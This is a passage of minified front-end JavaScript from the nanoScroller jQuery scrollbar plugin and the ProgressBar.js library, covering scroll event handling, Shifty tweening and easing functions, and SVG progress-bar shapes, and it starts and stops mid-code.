                                ((a = this),
                                function (t) {
                                    return (
                                        (a.sliderY = t.pageY - a.$el.offset().top - a.paneTop - (a.offsetY || 0.5 * a.sliderHeight)),
                                        a.scroll(),
                                        a.contentScrollTop >= a.maxScrollTop && a.prevScrollTop !== a.maxScrollTop ? a.$el.trigger("scrollend") : 0 === a.contentScrollTop && 0 !== a.prevScrollTop && a.$el.trigger("scrolltop"),
                                        !1
                                    );
                                }),
                            up:
                                ((r = this),
                                function (t) {
                                    return (r.isBeingDragged = !1), r.pane.removeClass(r.options.activeClass), r.doc.unbind(h, r.events.drag).unbind(u, r.events.up), r.body.unbind(l, r.events.enter), !1;
                                }),
                            resize:
                                ((s = this),
                                function (t) {
                                    s.reset();
                                }),
                            panedown:
                                ((n = this),
                                function (t) {
                                    return (n.sliderY = (t.offsetY || t.originalEvent.layerY) - 0.5 * n.sliderHeight), n.scroll(), n.events.down(t), !1;
                                }),
                            scroll:
                                ((i = this),
                                function (t) {
                                    i.updateScrollValues(),
                                        i.isBeingDragged ||
                                            (i.iOSNativeScrolling || ((i.sliderY = i.sliderTop), i.setOnScrollStyles()),
                                            null != t &&
                                                (i.contentScrollTop >= i.maxScrollTop
                                                    ? (i.options.preventPageScrolling && i.preventScrolling(t, o), i.prevScrollTop !== i.maxScrollTop && i.$el.trigger("scrollend"))
                                                    : 0 === i.contentScrollTop && (i.options.preventPageScrolling && i.preventScrolling(t, v), 0 !== i.prevScrollTop && i.$el.trigger("scrolltop"))));
                                }),
                            wheel:
                                ((e = this),
                                function (t) {
                                    var i;
                                    if (null != t)
                                        return (i = t.delta || t.wheelDelta || (t.originalEvent && t.originalEvent.wheelDelta) || -t.detail || (t.originalEvent && -t.originalEvent.detail)) && (e.sliderY += -i / 3), e.scroll(), !1;
                                }),
                            enter:
                                ((t = this),
                                function (e) {
                                    var i;
                                    if (t.isBeingDragged) return 1 !== (e.buttons || e.which) ? (i = t.events).up.apply(i, arguments) : void 0;
                                }),
                        };
                    }),
                    (d.prototype.addEvents = function () {
                        var t;
                        this.removeEvents(),
                            (t = this.events),
                            this.options.disableResize || this.win.bind(f, t[f]),
                            this.iOSNativeScrolling || (this.slider.bind(a, t[o]), this.pane.bind(a, t.panedown).bind(c + " " + r, t.wheel)),
                            this.$content.bind(p + " " + c + " " + r + " " + g, t[p]);
                    }),
                    (d.prototype.removeEvents = function () {
                        var t;
                        (t = this.events), this.win.unbind(f, t[f]), this.iOSNativeScrolling || (this.slider.unbind(), this.pane.unbind()), this.$content.unbind(p + " " + c + " " + r + " " + g, t[p]);
                    }),
                    (d.prototype.generate = function () {
                        var t, i, n, r, o;
                        return (
                            (r = (i = this.options).paneClass),
                            (o = i.sliderClass),
                            i.contentClass,
                            (n = this.$el.children("." + r)).length || n.children("." + o).length || this.$el.append('<div class="' + r + '"><div class="' + o + '" /></div>'),
                            (this.pane = this.$el.children("." + r)),
                            (this.slider = this.pane.find("." + o)),
                            0 === s && x()
                                ? (t = {
                                      right: -14,
                                      paddingRight:
                                          +e
                                              .getComputedStyle(this.content, null)
                                              .getPropertyValue("padding-right")
                                              .replace(/[^0-9.]+/g, "") + 14,
                                  })
                                : s && ((t = { right: -s }), this.$el.addClass(i.enabledClass)),
                            null != t && this.$content.css(t),
                            this
                        );
                    }),
                    (d.prototype.restore = function () {
                        (this.stopped = !1), this.iOSNativeScrolling || this.pane.show(), this.addEvents();
                    }),
                    (d.prototype.reset = function () {
                        var t, e, i, r, o, a, l, h, u, c, d;
                        if (!this.iOSNativeScrolling)
                            return (
                                this.$el.find("." + this.options.paneClass).length || this.generate().stop(),
                                this.stopped && this.restore(),
                                (o = (r = (t = this.content).style).overflowY),
                                n && this.$content.css({ height: this.$content.height() }),
                                (e = t.scrollHeight + s),
                                (u = parseInt(this.$el.css("max-height"), 10)) > 0 && (this.$el.height(""), this.$el.height(t.scrollHeight > u ? u : t.scrollHeight)),
                                (l = (a = this.pane.outerHeight(!1)) + (h = parseInt(this.pane.css("top"), 10)) + parseInt(this.pane.css("bottom"), 10)),
                                (d = Math.round((l / e) * a)) < this.options.sliderMinHeight
                                    ? (d = this.options.sliderMinHeight)
                                    : null != this.options.sliderMaxHeight && d > this.options.sliderMaxHeight && (d = this.options.sliderMaxHeight),
                                o === p && r.overflowX !== p && (d += s),
                                (this.maxSliderTop = l - d),
                                (this.contentHeight = e),
                                (this.paneHeight = a),
                                (this.paneOuterHeight = l),
                                (this.sliderHeight = d),
                                (this.paneTop = h),
                                this.slider.height(d),
                                this.events.scroll(),
                                this.pane.show(),
                                (this.isActive = !0),
                                t.scrollHeight === t.clientHeight || (this.pane.outerHeight(!0) >= t.scrollHeight && o !== p)
                                    ? (this.pane.hide(), (this.isActive = !1))
                                    : this.el.clientHeight === t.scrollHeight && o === p
                                    ? this.slider.hide()
                                    : this.slider.show(),
                                this.pane.css({ opacity: this.options.alwaysVisible ? 1 : "", visibility: this.options.alwaysVisible ? "visible" : "" }),
                                ("static" !== (i = this.$content.css("position")) && "relative" !== i) || ((c = parseInt(this.$content.css("right"), 10)) && this.$content.css({ right: "", marginRight: c })),
                                this
                            );
                        this.contentHeight = this.content.scrollHeight;
                    }),
                    (d.prototype.scroll = function () {
                        if (this.isActive)
                            return (
                                (this.sliderY = Math.max(0, this.sliderY)),
                                (this.sliderY = Math.min(this.maxSliderTop, this.sliderY)),
                                this.$content.scrollTop((this.maxScrollTop * this.sliderY) / this.maxSliderTop),
                                this.iOSNativeScrolling || (this.updateScrollValues(), this.setOnScrollStyles()),
                                this
                            );
                    }),
                    (d.prototype.scrollBottom = function (t) {
                        if (this.isActive) return this.$content.scrollTop(this.contentHeight - this.$content.height() - t).trigger(c), this.stop().restore(), this;
                    }),
                    (d.prototype.scrollTop = function (t) {
                        if (this.isActive) return this.$content.scrollTop(+t).trigger(c), this.stop().restore(), this;
                    }),
                    (d.prototype.scrollTo = function (t) {
                        if (this.isActive) return this.scrollTop(this.$el.find(t).get(0).offsetTop), this;
                    }),
                    (d.prototype.stop = function () {
                        return m && this.scrollRAF && (m(this.scrollRAF), (this.scrollRAF = null)), (this.stopped = !0), this.removeEvents(), this.iOSNativeScrolling || this.pane.hide(), this;
                    }),
                    (d.prototype.destroy = function () {
                        return (
                            this.stopped || this.stop(),
                            !this.iOSNativeScrolling && this.pane.length && this.pane.remove(),
                            n && this.$content.height(""),
                            this.$content.removeAttr("tabindex"),
                            this.$el.hasClass(this.options.enabledClass) && (this.$el.removeClass(this.options.enabledClass), this.$content.css({ right: "" })),
                            this
                        );
                    }),
                    (d.prototype.flash = function () {
                        var t;
                        if (!this.iOSNativeScrolling && this.isActive)
                            return (
                                this.reset(),
                                this.pane.addClass(this.options.flashedClass),
                                setTimeout(
                                    ((t = this),
                                    function () {
                                        t.pane.removeClass(t.options.flashedClass);
                                    }),
                                    this.options.flashDelay
                                ),
                                this
                            );
                    }),
                    d
                );
            })()),
            (t.fn.nanoScroller = function (e) {
                return this.each(function () {
                    var i, n;
                    if (((n = this.nanoscroller) || ((i = t.extend({}, _, e)), (this.nanoscroller = n = new d(this, i))), e && "object" == typeof e)) {
                        if ((t.extend(n.options, e), null != e.scrollBottom)) return n.scrollBottom(e.scrollBottom);
                        if (null != e.scrollTop) return n.scrollTop(e.scrollTop);
                        if (e.scrollTo) return n.scrollTo(e.scrollTo);
                        if ("bottom" === e.scroll) return n.scrollBottom(0);
                        if ("top" === e.scroll) return n.scrollTop(0);
                        if (e.scroll && e.scroll instanceof t) return n.scrollTo(e.scroll);
                        if (e.stop) return n.stop();
                        if (e.destroy) return n.destroy();
                        if (e.flash) return n.flash();
                    }
                    return n.reset();
                });
            }),
            (t.fn.nanoScroller.Constructor = d);
    }),
    (function (t) {
        if ("object" == typeof exports && "undefined" != typeof module) module.exports = t();
        else if ("function" == typeof define && define.amd) define([], t);
        else {
            ("undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : this).ProgressBar = t();
        }
    })(function () {
        return (function t(e, i, n) {
            function s(o, a) {
                if (!i[o]) {
                    if (!e[o]) {
                        var l = "function" == typeof require && require;
                        if (!a && l) return l(o, !0);
                        if (r) return r(o, !0);
                        var h = new Error("Cannot find module '" + o + "'");
                        throw ((h.code = "MODULE_NOT_FOUND"), h);
                    }
                    var u = (i[o] = { exports: {} });
                    e[o][0].call(
                        u.exports,
                        function (t) {
                            var i = e[o][1][t];
                            return s(i || t);
                        },
                        u,
                        u.exports,
                        t,
                        e,
                        i,
                        n
                    );
                }
                return i[o].exports;
            }
            for (var r = "function" == typeof require && require, o = 0; o < n.length; o++) s(n[o]);
            return s;
        })(
            {
                1: [
                    function (t, e, i) {
                        (function () {
                            var t,
                                n = this || Function("return this")(),
                                s = (function () {
                                    "use strict";
                                    function t() {}
                                    function s(t, e) {
                                        var i;
                                        for (i in t) Object.hasOwnProperty.call(t, i) && e(i);
                                    }
                                    function r(t, e) {
                                        return (
                                            s(e, function (i) {
                                                t[i] = e[i];
                                            }),
                                            t
                                        );
                                    }
                                    function o(t, e) {
                                        s(e, function (i) {
                                            void 0 === t[i] && (t[i] = e[i]);
                                        });
                                    }
                                    function a(t, e, i, n, s, r, o) {
                                        var a,
                                            h,
                                            u,
                                            c = t < r ? 0 : (t - r) / s;
                                        for (a in e) e.hasOwnProperty(a) && ((u = "function" == typeof (h = o[a]) ? h : f[h]), (e[a] = l(i[a], n[a], u, c)));
                                        return e;
                                    }
                                    function l(t, e, i, n) {
                                        return t + (e - t) * i(n);
                                    }
                                    function h(t, e) {
                                        var i = d.prototype.filter,
                                            n = t._filterArgs;
                                        s(i, function (s) {
                                            void 0 !== i[s][e] && i[s][e].apply(t, n);
                                        });
                                    }
                                    function u(t, e, i, n, s, r, o, l, u, c, d) {
                                        (g = e + i + n),
                                            (v = Math.min(d || b(), g)),
                                            (m = v >= g),
                                            (_ = n - (g - v)),
                                            t.isPlaying() &&
                                                (m
                                                    ? (u(o, t._attachment, _), t.stop(!0))
                                                    : ((t._scheduleId = c(t._timeoutHandler, w)), h(t, "beforeTween"), v < e + i ? a(1, s, r, o, 1, 1, l) : a(v, s, r, o, n, e + i, l), h(t, "afterTween"), u(s, t._attachment, _)));
                                    }
                                    function c(t, e) {
                                        var i = {},
                                            n = typeof e;
                                        return (
                                            s(
                                                t,
                                                "string" === n || "function" === n
                                                    ? function (t) {
                                                          i[t] = e;
                                                      }
                                                    : function (t) {
                                                          i[t] || (i[t] = e[t] || y);
                                                      }
                                            ),
                                            i
                                        );
                                    }
                                    function d(t, e) {
                                        (this._currentState = t || {}), (this._configured = !1), (this._scheduleFunction = p), void 0 !== e && this.setConfig(e);
                                    }
                                    var f,
                                        p,
                                        g,
                                        v,
                                        m,
                                        _,
                                        y = "linear",
                                        w = 1e3 / 60,
                                        x = Date.now
                                            ? Date.now
                                            : function () {
                                                  return +new Date();
                                              },
                                        b = "undefined" != typeof SHIFTY_DEBUG_NOW ? SHIFTY_DEBUG_NOW : x;
                                    return (
                                        (p =
                                            ("undefined" != typeof window &&
                                                (window.requestAnimationFrame ||
                                                    window.webkitRequestAnimationFrame ||
                                                    window.oRequestAnimationFrame ||
                                                    window.msRequestAnimationFrame ||
                                                    (window.mozCancelRequestAnimationFrame && window.mozRequestAnimationFrame))) ||
                                            setTimeout),
                                        (d.prototype.tween = function (t) {
                                            return this._isTweening ? this : ((void 0 === t && this._configured) || this.setConfig(t), (this._timestamp = b()), this._start(this.get(), this._attachment), this.resume());
                                        }),
                                        (d.prototype.setConfig = function (e) {
                                            (e = e || {}),
                                                (this._configured = !0),
                                                (this._attachment = e.attachment),
                                                (this._pausedAtTime = null),
                                                (this._scheduleId = null),
                                                (this._delay = e.delay || 0),
                                                (this._start = e.start || t),
                                                (this._step = e.step || t),
                                                (this._finish = e.finish || t),
                                                (this._duration = e.duration || 500),
                                                (this._currentState = r({}, e.from || this.get())),
                                                (this._originalState = this.get()),
                                                (this._targetState = r({}, e.to || this.get()));
                                            var i = this;
                                            this._timeoutHandler = function () {
                                                u(i, i._timestamp, i._delay, i._duration, i._currentState, i._originalState, i._targetState, i._easing, i._step, i._scheduleFunction);
                                            };
                                            var n = this._currentState,
                                                s = this._targetState;
                                            return o(s, n), (this._easing = c(n, e.easing || y)), (this._filterArgs = [n, this._originalState, s, this._easing]), h(this, "tweenCreated"), this;
                                        }),
                                        (d.prototype.get = function () {
                                            return r({}, this._currentState);
                                        }),
                                        (d.prototype.set = function (t) {
                                            this._currentState = t;
                                        }),
                                        (d.prototype.pause = function () {
                                            return (this._pausedAtTime = b()), (this._isPaused = !0), this;
                                        }),
                                        (d.prototype.resume = function () {
                                            return this._isPaused && (this._timestamp += b() - this._pausedAtTime), (this._isPaused = !1), (this._isTweening = !0), this._timeoutHandler(), this;
                                        }),
                                        (d.prototype.seek = function (t) {
                                            t = Math.max(t, 0);
                                            var e = b();
                                            return this._timestamp + t === 0
                                                ? this
                                                : ((this._timestamp = e - t),
                                                  this.isPlaying() ||
                                                      ((this._isTweening = !0),
                                                      (this._isPaused = !1),
                                                      u(this, this._timestamp, this._delay, this._duration, this._currentState, this._originalState, this._targetState, this._easing, this._step, this._scheduleFunction, e),
                                                      this.pause()),
                                                  this);
                                        }),
                                        (d.prototype.stop = function (e) {
                                            return (
                                                (this._isTweening = !1),
                                                (this._isPaused = !1),
                                                (this._timeoutHandler = t),
                                                (n.cancelAnimationFrame || n.webkitCancelAnimationFrame || n.oCancelAnimationFrame || n.msCancelAnimationFrame || n.mozCancelRequestAnimationFrame || n.clearTimeout)(this._scheduleId),
                                                e &&
                                                    (h(this, "beforeTween"),
                                                    a(1, this._currentState, this._originalState, this._targetState, 1, 0, this._easing),
                                                    h(this, "afterTween"),
                                                    h(this, "afterTweenEnd"),
                                                    this._finish.call(this, this._currentState, this._attachment)),
                                                this
                                            );
                                        }),
                                        (d.prototype.isPlaying = function () {
                                            return this._isTweening && !this._isPaused;
                                        }),
                                        (d.prototype.setScheduleFunction = function (t) {
                                            this._scheduleFunction = t;
                                        }),
                                        (d.prototype.dispose = function () {
                                            var t;
                                            for (t in this) this.hasOwnProperty(t) && delete this[t];
                                        }),
                                        (d.prototype.filter = {}),
                                        (f = d.prototype.formula = {
                                            linear: function (t) {
                                                return t;
                                            },
                                        }),
                                        r(d, { now: b, each: s, tweenProps: a, tweenProp: l, applyFilter: h, shallowCopy: r, defaults: o, composeEasingObject: c }),
                                        "function" == typeof SHIFTY_DEBUG_NOW && (n.timeoutHandler = u),
                                        "object" == typeof i ? (e.exports = d) : void 0 === n.Tweenable && (n.Tweenable = d),
                                        d
                                    );
                                })();
                            s.shallowCopy(s.prototype.formula, {
                                easeInQuad: function (t) {
                                    return Math.pow(t, 2);
                                },
                                easeOutQuad: function (t) {
                                    return -(Math.pow(t - 1, 2) - 1);
                                },
                                easeInOutQuad: function (t) {
                                    return (t /= 0.5) < 1 ? 0.5 * Math.pow(t, 2) : -0.5 * ((t -= 2) * t - 2);
                                },
                                easeInCubic: function (t) {
                                    return Math.pow(t, 3);
                                },
                                easeOutCubic: function (t) {
                                    return Math.pow(t - 1, 3) + 1;
                                },
                                easeInOutCubic: function (t) {
                                    return (t /= 0.5) < 1 ? 0.5 * Math.pow(t, 3) : 0.5 * (Math.pow(t - 2, 3) + 2);
                                },
                                easeInQuart: function (t) {
                                    return Math.pow(t, 4);
                                },
                                easeOutQuart: function (t) {
                                    return -(Math.pow(t - 1, 4) - 1);
                                },
                                easeInOutQuart: function (t) {
                                    return (t /= 0.5) < 1 ? 0.5 * Math.pow(t, 4) : -0.5 * ((t -= 2) * Math.pow(t, 3) - 2);
                                },
                                easeInQuint: function (t) {
                                    return Math.pow(t, 5);
                                },
                                easeOutQuint: function (t) {
                                    return Math.pow(t - 1, 5) + 1;
                                },
                                easeInOutQuint: function (t) {
                                    return (t /= 0.5) < 1 ? 0.5 * Math.pow(t, 5) : 0.5 * (Math.pow(t - 2, 5) + 2);
                                },
                                easeInSine: function (t) {
                                    return 1 - Math.cos(t * (Math.PI / 2));
                                },
                                easeOutSine: function (t) {
                                    return Math.sin(t * (Math.PI / 2));
                                },
                                easeInOutSine: function (t) {
                                    return -0.5 * (Math.cos(Math.PI * t) - 1);
                                },
                                easeInExpo: function (t) {
                                    return 0 === t ? 0 : Math.pow(2, 10 * (t - 1));
                                },
                                easeOutExpo: function (t) {
                                    return 1 === t ? 1 : 1 - Math.pow(2, -10 * t);
                                },
                                easeInOutExpo: function (t) {
                                    return 0 === t ? 0 : 1 === t ? 1 : (t /= 0.5) < 1 ? 0.5 * Math.pow(2, 10 * (t - 1)) : 0.5 * (2 - Math.pow(2, -10 * --t));
                                },
                                easeInCirc: function (t) {
                                    return -(Math.sqrt(1 - t * t) - 1);
                                },
                                easeOutCirc: function (t) {
                                    return Math.sqrt(1 - Math.pow(t - 1, 2));
                                },
                                easeInOutCirc: function (t) {
                                    return (t /= 0.5) < 1 ? -0.5 * (Math.sqrt(1 - t * t) - 1) : 0.5 * (Math.sqrt(1 - (t -= 2) * t) + 1);
                                },
                                easeOutBounce: function (t) {
                                    return t < 1 / 2.75 ? 7.5625 * t * t : t < 2 / 2.75 ? 7.5625 * (t -= 1.5 / 2.75) * t + 0.75 : t < 2.5 / 2.75 ? 7.5625 * (t -= 2.25 / 2.75) * t + 0.9375 : 7.5625 * (t -= 2.625 / 2.75) * t + 0.984375;
                                },
                                easeInBack: function (t) {
                                    return t * t * (2.70158 * t - 1.70158);
                                },
                                easeOutBack: function (t) {
                                    return (t -= 1) * t * (2.70158 * t + 1.70158) + 1;
                                },
                                easeInOutBack: function (t) {
                                    var e = 1.70158;
                                    return (t /= 0.5) < 1 ? t * t * ((1 + (e *= 1.525)) * t - e) * 0.5 : 0.5 * ((t -= 2) * t * ((1 + (e *= 1.525)) * t + e) + 2);
                                },
                                elastic: function (t) {
                                    return -1 * Math.pow(4, -8 * t) * Math.sin(((6 * t - 1) * (2 * Math.PI)) / 2) + 1;
                                },
                                swingFromTo: function (t) {
                                    var e = 1.70158;
                                    return (t /= 0.5) < 1 ? t * t * ((1 + (e *= 1.525)) * t - e) * 0.5 : 0.5 * ((t -= 2) * t * ((1 + (e *= 1.525)) * t + e) + 2);
                                },
                                swingFrom: function (t) {
                                    return t * t * (2.70158 * t - 1.70158);
                                },
                                swingTo: function (t) {
                                    return (t -= 1) * t * (2.70158 * t + 1.70158) + 1;
                                },
                                bounce: function (t) {
                                    return t < 1 / 2.75 ? 7.5625 * t * t : t < 2 / 2.75 ? 7.5625 * (t -= 1.5 / 2.75) * t + 0.75 : t < 2.5 / 2.75 ? 7.5625 * (t -= 2.25 / 2.75) * t + 0.9375 : 7.5625 * (t -= 2.625 / 2.75) * t + 0.984375;
                                },
                                bouncePast: function (t) {
                                    return t < 1 / 2.75
                                        ? 7.5625 * t * t
                                        : t < 2 / 2.75
                                        ? 2 - (7.5625 * (t -= 1.5 / 2.75) * t + 0.75)
                                        : t < 2.5 / 2.75
                                        ? 2 - (7.5625 * (t -= 2.25 / 2.75) * t + 0.9375)
                                        : 2 - (7.5625 * (t -= 2.625 / 2.75) * t + 0.984375);
                                },
                                easeFromTo: function (t) {
                                    return (t /= 0.5) < 1 ? 0.5 * Math.pow(t, 4) : -0.5 * ((t -= 2) * Math.pow(t, 3) - 2);
                                },
                                easeFrom: function (t) {
                                    return Math.pow(t, 4);
                                },
                                easeTo: function (t) {
                                    return Math.pow(t, 0.25);
                                },
                            }),
                                (function () {
                                    function t(t, e, i, n, s, r) {
                                        function o(t) {
                                            return ((h * t + u) * t + c) * t;
                                        }
                                        function a(t) {
                                            return t >= 0 ? t : 0 - t;
                                        }
                                        var l,
                                            h = 0,
                                            u = 0,
                                            c = 0,
                                            d = 0,
                                            f = 0,
                                            p = 0;
                                        return (
                                            (h = 1 - (c = 3 * e) - (u = 3 * (n - e) - c)),
                                            (d = 1 - (p = 3 * i) - (f = 3 * (s - i) - p)),
                                            (l = (function (t, e) {
                                                var i, n, s, r, l, d, f;
                                                for (s = t, d = 0; d < 8; d++) {
                                                    if (a((r = o(s) - t)) < e) return s;
                                                    if (a((l = (3 * h * (f = s) + 2 * u) * f + c)) < 1e-6) break;
                                                    s -= r / l;
                                                }
                                                if (((n = 1), (s = t) < (i = 0))) return i;
                                                if (s > n) return n;
                                                for (; i < n; ) {
                                                    if (a((r = o(s)) - t) < e) return s;
                                                    t > r ? (i = s) : (n = s), (s = 0.5 * (n - i) + i);
                                                }
                                                return s;
                                            })(t, 1 / (200 * r))),
                                            ((d * l + f) * l + p) * l
                                        );
                                    }
                                    (s.setBezierFunction = function (e, i, n, r, o) {
                                        var a,
                                            l,
                                            h,
                                            u,
                                            c =
                                                ((a = i),
                                                (l = n),
                                                (h = r),
                                                (u = o),
                                                function (e) {
                                                    return t(e, a, l, h, u, 1);
                                                });
                                        return (c.displayName = e), (c.x1 = i), (c.y1 = n), (c.x2 = r), (c.y2 = o), (s.prototype.formula[e] = c);
                                    }),
                                        (s.unsetBezierFunction = function (t) {
                                            delete s.prototype.formula[t];
                                        });
                                })(),
                                ((t = new s())._filterArgs = []),
                                (s.interpolate = function (e, i, n, r, o) {
                                    var a = s.shallowCopy({}, e),
                                        l = o || 0,
                                        h = s.composeEasingObject(e, r || "linear");
                                    t.set({});
                                    var u = t._filterArgs;
                                    (u.length = 0), (u[0] = a), (u[1] = e), (u[2] = i), (u[3] = h), s.applyFilter(t, "tweenCreated"), s.applyFilter(t, "beforeTween");
                                    var c,
                                        d,
                                        f,
                                        p,
                                        g,
                                        v,
                                        m = ((c = e), (d = a), (f = i), (p = n), (g = h), (v = l), s.tweenProps(p, d, c, f, 1, v, g));
                                    return s.applyFilter(t, "afterTween"), m;
                                }),
                                (function (t) {
                                    function e(e) {
                                        t.each(e, function (t) {
                                            var n = e[t];
                                            "string" == typeof n && n.match(g) && (e[t] = s(g, n, i));
                                        });
                                    }
                                    function i(t) {
                                        var e,
                                            i =
                                                (3 === (e = (e = t).replace(/#/, "")).length && (e = (e = e.split(""))[0] + e[0] + e[1] + e[1] + e[2] + e[2]),
                                                (m[0] = n(e.substr(0, 2))),
                                                (m[1] = n(e.substr(2, 2))),
                                                (m[2] = n(e.substr(4, 2))),
                                                m);
                                        return "rgb(" + i[0] + "," + i[1] + "," + i[2] + ")";
                                    }
                                    function n(t) {
                                        return parseInt(t, 16);
                                    }
                                    function s(t, e, i) {
                                        var n = e.match(t),
                                            s = e.replace(t, v);
                                        if (n) for (var r, o = n.length, a = 0; a < o; a++) (r = n.shift()), (s = s.replace(v, i(r)));
                                        return s;
                                    }
                                    function r(t) {
                                        for (var e = t.match(d), i = e.length, n = t.match(p)[0], s = 0; s < i; s++) n += parseInt(e[s], 10) + ",";
                                        return n.slice(0, -1) + ")";
                                    }
                                    function o(e) {
                                        var i = {};
                                        return (
                                            t.each(e, function (t) {
                                                var n,
                                                    s,
                                                    r = e[t];
                                                if ("string" == typeof r) {
                                                    var o = h(r);
                                                    i[t] = {
                                                        formatString: ((n = r), (s = n.match(c)), s ? (1 === s.length || n.charAt(0).match(u)) && s.unshift("") : (s = ["", ""]), s.join(v)),
                                                        chunkNames: (function (t, e) {
                                                            var i,
                                                                n = [],
                                                                s = t.length;
                                                            for (i = 0; i < s; i++) n.push("_" + e + "_" + i);
                                                            return n;
                                                        })(o, t),
                                                    };
                                                }
                                            }),
                                            i
                                        );
                                    }
                                    function a(e, i) {
                                        t.each(i, function (t) {
                                            for (var n = h(e[t]), s = n.length, r = 0; r < s; r++) e[i[t].chunkNames[r]] = +n[r];
                                            delete e[t];
                                        });
                                    }
                                    function l(e, i) {
                                        t.each(i, function (t) {
                                            var n = e[t],
                                                o = (function (t, e) {
                                                    _.length = 0;
                                                    for (var i = e.length, n = 0; n < i; n++) _.push(t[e[n]]);
                                                    return _;
                                                })(
                                                    (function (t, e) {
                                                        for (var i, n = {}, s = e.length, r = 0; r < s; r++) (i = e[r]), (n[i] = t[i]), delete t[i];
                                                        return n;
                                                    })(e, i[t].chunkNames),
                                                    i[t].chunkNames
                                                );
                                            (n = (function (t, e) {
                                                for (var i = t, n = e.length, s = 0; s < n; s++) i = i.replace(v, +e[s].toFixed(4));
                                                return i;
                                            })(i[t].formatString, o)),
                                                (e[t] = s(f, n, r));
                                        });
                                    }
                                    function h(t) {
                                        return t.match(d);
                                    }
                                    var u = /(\d|\-|\.)/,
                                        c = /([^\-0-9\.]+)/g,
                                        d = /[0-9.\-]+/g,
                                        f = new RegExp("rgb\\(" + d.source + /,\s*/.source + d.source + /,\s*/.source + d.source + "\\)", "g"),
                                        p = /^.*\(/,
                                        g = /#([0-9]|[a-f]){3,6}/gi,
                                        v = "VAL",
                                        m = [],
                                        _ = [];
                                    t.prototype.filter.token = {
                                        tweenCreated: function (t, i, n, s) {
                                            e(t), e(i), e(n), (this._tokenData = o(t));
                                        },
                                        beforeTween: function (e, i, n, s) {
                                            var r, o;
                                            (r = s),
                                                (o = this._tokenData),
                                                t.each(o, function (t) {
                                                    var e,
                                                        i = o[t].chunkNames,
                                                        n = i.length,
                                                        s = r[t];
                                                    if ("string" == typeof s) {
                                                        var a = s.split(" "),
                                                            l = a[a.length - 1];
                                                        for (e = 0; e < n; e++) r[i[e]] = a[e] || l;
                                                    } else for (e = 0; e < n; e++) r[i[e]] = s;
                                                    delete r[t];
                                                }),
                                                a(e, this._tokenData),
                                                a(i, this._tokenData),
                                                a(n, this._tokenData);
                                        },
                                        afterTween: function (e, i, n, s) {
                                            var r, o;
                                            l(e, this._tokenData),
                                                l(i, this._tokenData),
                                                l(n, this._tokenData),
                                                (r = s),
                                                (o = this._tokenData),
                                                t.each(o, function (t) {
                                                    var e = o[t].chunkNames,
                                                        i = e.length,
                                                        n = r[e[0]];
                                                    if ("string" == typeof n) {
                                                        for (var s = "", a = 0; a < i; a++) (s += " " + r[e[a]]), delete r[e[a]];
                                                        r[t] = s.substr(1);
                                                    } else r[t] = n;
                                                });
                                        },
                                    };
                                })(s);
                        }.call(null));
                    },
                    {},
                ],
                2: [
                    function (t, e, i) {
                        var n = t("./shape"),
                            s = t("./utils"),
                            r = function (t, e) {
                                (this._pathTemplate = "M 50,50 m 0,-{radius} a {radius},{radius} 0 1 1 0,{2radius} a {radius},{radius} 0 1 1 0,-{2radius}"), (this.containerAspectRatio = 1), n.apply(this, arguments);
                            };
                        ((r.prototype = new n()).constructor = r),
                            (r.prototype._pathString = function (t) {
                                var e = t.strokeWidth;
                                t.trailWidth && t.trailWidth > t.strokeWidth && (e = t.trailWidth);
                                var i = 50 - e / 2;
                                return s.render(this._pathTemplate, { radius: i, "2radius": 2 * i });
                            }),
                            (r.prototype._trailString = function (t) {
                                return this._pathString(t);
                            }),
                            (e.exports = r);
                    },
                    { "./shape": 7, "./utils": 9 },
                ],
                3: [
                    function (t, e, i) {
                        var n = t("./shape"),
                            s = t("./utils"),
                            r = function (t, e) {
                                (this._pathTemplate = "M 0,{center} L 100,{center}"), n.apply(this, arguments);
                            };
                        ((r.prototype = new n()).constructor = r),
                            (r.prototype._initializeSvg = function (t, e) {
                                t.setAttribute("viewBox", "0 0 100 " + e.strokeWidth), t.setAttribute("preserveAspectRatio", "none");
                            }),
                            (r.prototype._pathString = function (t) {
                                return s.render(this._pathTemplate, { center: t.strokeWidth / 2 });
                            }),
                            (r.prototype._trailString = function (t) {
                                return this._pathString(t);
                            }),
                            (e.exports = r);
                    },
                    { "./shape": 7, "./utils": 9 },
                ],
                4: [
                    function (t, e, i) {
                        e.exports = { Line: t("./line"), Circle: t("./circle"), SemiCircle: t("./semicircle"), Square: t("./square"), Path: t("./path"), Shape: t("./shape"), utils: t("./utils") };
                    },
                    { "./circle": 2, "./line": 3, "./path": 5, "./semicircle": 6, "./shape": 7, "./square": 8, "./utils": 9 },
                ],
                5: [
                    function (t, e, i) {
                        var n = t("shifty"),
                            s = t("./utils"),
                            r = { easeIn: "easeInCubic", easeOut: "easeOutCubic", easeInOut: "easeInOutCubic" },
                            o = function t(e, i) {
                                if (!(this instanceof t)) throw new Error("Constructor was called without new keyword");
                                var n;
                                (i = s.extend({ duration: 800, easing: "linear", from: {}, to: {}, step: function () {} }, i)),
                                    (n = s.isString(e) ? document.querySelector(e) : e),
                                    (this.path = n),
                                    (this._opts = i),
                                    (this._tweenable = null);
                                var r = this.path.getTotalLength();
                                (this.path.style.strokeDasharray = r + " " + r), this.set(0);
                            };
                        (o.prototype.value = function () {
                            var t = this._getComputedDashOffset(),
                                e = this.path.getTotalLength();
                            return parseFloat((1 - t / e).toFixed(6), 10);
                        }),
                            (o.prototype.set = function (t) {
                                this.stop(), (this.path.style.strokeDashoffset = this._progressToOffset(t));
                                var e = this._opts.step;
                                if (s.isFunction(e)) {
                                    var i = this._easing(this._opts.easing);
                                    e(this._calculateTo(t, i), this._opts.shape || this, this._opts.attachment);
                                }
                            }),
                            (o.prototype.stop = function () {
                                this._stopTween(), (this.path.style.strokeDashoffset = this._getComputedDashOffset());
                            }),
                            (o.prototype.animate = function (t, e, i) {
                                (e = e || {}), s.isFunction(e) && ((i = e), (e = {}));
                                var r = s.extend({}, e),
                                    o = s.extend({}, this._opts);
                                e = s.extend(o, e);
                                var a = this._easing(e.easing),
                                    l = this._resolveFromAndTo(t, a, r);
                                this.stop(), this.path.getBoundingClientRect();
                                var h = this._getComputedDashOffset(),
                                    u = this._progressToOffset(t),
                                    c = this;
                                (this._tweenable = new n()),
                                    this._tweenable.tween({
                                        from: s.extend({ offset: h }, l.from),
                                        to: s.extend({ offset: u }, l.to),
                                        duration: e.duration,
                                        easing: a,
                                        step: function (t) {
                                            c.path.style.strokeDashoffset = t.offset;
                                            var i = e.shape || c;
                                            e.step(t, i, e.attachment);
                                        },
                                        finish: function (t) {
